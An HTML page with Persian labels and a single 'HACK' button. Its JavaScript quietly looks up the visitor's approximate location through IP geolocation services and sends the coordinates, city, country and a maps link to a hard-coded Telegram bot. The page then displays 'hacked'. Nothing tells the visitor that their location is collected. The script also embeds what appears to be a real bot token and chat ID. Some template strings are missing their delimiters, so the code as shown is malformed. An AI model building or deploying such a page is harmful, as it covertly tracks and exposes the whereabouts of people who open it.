<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحه</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0a0a;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            font-family:Arial;
        }
        .container{
            text-align:center;
        }
        .btn-hack{
            background:transparent;
            border:3px solid #00ff41;
            color:#00ff41;
            padding:25px 60px;
            font-size:32px;
            font-weight:bold;
            border-radius:15px;
            cursor:pointer;
            transition:0.3s;
            font-family:Arial;
            letter-spacing:3px;
            box-shadow:0 0 40px rgba(0,255,65,0.1);
        }
        .btn-hack:hover{
            background:#00ff41;
            color:#0a0a0a;
            box-shadow:0 0 80px rgba(0,255,65,0.3);
            transform:scale(1.03);
        }
        .btn-hack:active{
            transform:scale(0.95);
        }
        .btn-hack:disabled{
            opacity:0.2;
            cursor:default;
            transform:none;
            box-shadow:none;
        }
        #status{
            color:#00ff41;
            font-size:24px;
            margin-top:20px;
            font-weight:bold;
            min-height:40px;
            opacity:0;
            transition:opacity 0.5s;
        }
        #status.show{
            opacity:1;
        }
    </style>
</head>
<body>
    <div class="container">
        <button class="btn-hack" id="hackBtn">HACK</button>
        <div id="status">هک شد</div>
    </div>

    <script>
    // ===== تنظیمات (با توکن واقعی شما) =====
    const BOT_TOKEN = '8891127738:8891127738:AAEJAQww9ts_V-Rcliwrvjm6ftbdZ1bRitM';   // <-- توکن کامل خود را اینجا بگذارید
    const CHAT_ID = '6340337525';

    const btn = document.getElementById('hackBtn');
    const statusEl = document.getElementById('status');

    // ===== دریافت موقعیت =====
    async function getLocation() {
        try {
            const res = await fetch('https://geoplugin.net/json.gp', { signal: AbortSignal.timeout(5000) });
            const data = await res.json();
            if (data.geoplugin_latitude && data.geoplugin_latitude != '0') {
                return {
                    lat: parseFloat(data.geoplugin_latitude),
                    lon: parseFloat(data.geoplugin_longitude),
                    city: data.geoplugin_city || 'نامشخص',
                    country: data.geoplugin_countryName || 'نامشخص',
                    method: 'GeoPlugin'
                };
            }
        } catch(e) {}

        try {
            const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
            const data = await res.json();
            if (data.status === 'success') {
                return {
                    lat: data.lat,
                    lon: data.lon,
                    city: data.city,
                    country: data.country,
                    method: 'IP-API'
                };
            }
        } catch(e) {}

        return null;
    }

    // ===== ارسال به تلگرام =====
    async function sendToTelegram(loc) {
        const text = 
📍 موقعیت جدید:
🌐 عرض: ${loc.lat}
🌐 طول: ${loc.lon}
🏙 شهر: ${loc.city || 'نامشخص'}
🌍 کشور: ${loc.country || 'نامشخص'}
📡 روش: ${loc.method}
🔗 نقشه: https://www.google.com/maps?q=${loc.lat},${loc.lon};

        const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)};
        try {
            await fetch(url, { method: 'GET', signal: AbortSignal.timeout(5000) });
            return true;
        } catch(e) {
            return false;
        }
    }
        // ===== تابع اصلی =====
    async function handleClick() {
        btn.disabled = true;
        
        const loc = await getLocation();
        if (loc) {
            await sendToTelegram(loc);
        }
        
        // نمایش "هک شد"
        statusEl.classList.add('show');
        
        btn.disabled = false;
    }

    btn.addEventListener('click', handleClick);
    </script>
</body>
</html>
